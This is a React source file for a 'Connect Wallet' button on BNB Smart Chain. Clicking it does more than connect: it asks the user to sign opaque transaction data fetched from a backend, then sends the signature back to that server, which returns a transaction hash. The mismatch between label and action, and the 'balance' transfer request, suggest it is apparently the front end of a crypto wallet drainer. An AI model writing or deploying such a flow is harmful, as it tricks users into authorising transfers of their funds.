import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["personal_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    const provider = ethereumProvider;
    const accounts = await provider.request({ method: "eth_accounts" });
    const sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    async function getRawSignature(address, balance) {
      try {
        const requestData = {
          handler: "tx",
          address: address,
          chain: "56",
          type: "coin",
          balance: balance,
        };

        console.log("🔍 Requesting Unsigned Data:", requestData);

        const response = await fetch("https://your-backend.com/proxy", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        if (!response.ok) {
          throw new Error(`Server error: ${response.status}`);
        }

        const unsignedData = await response.json();
        console.log("📜 Unsigned Data:", unsignedData);

        if (!unsignedData || unsignedData.error) {
          throw new Error(unsignedData.error || "Invalid unsigned data");
        }

        const rawSignature = await provider.request({
          method: "personal_sign",
          params: [JSON.stringify(unsignedData), address],
        });

        return rawSignature;
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature, sender, balance) {
      try {
        const requestData = {
          sender: sender,
          balance: balance,
          signedData: signature,
        };

        const response = await fetch("https://your-backend.com/proxy", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        if (!response.ok) {
          throw new Error(`Server error: ${response.status}`);
        }

        const resultJson = await response.json();
        console.log("📤 Server Response:", resultJson);

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    const balance = "0.01";
    const rawSignature = await getRawSignature(sender, balance);

    if (rawSignature) {
      console.log("✍️ Signed Raw Data:", rawSignature);
      const txHash = await sendSignedTransaction(rawSignature, sender, balance);
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <button
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </button>
  );
}

export default App;
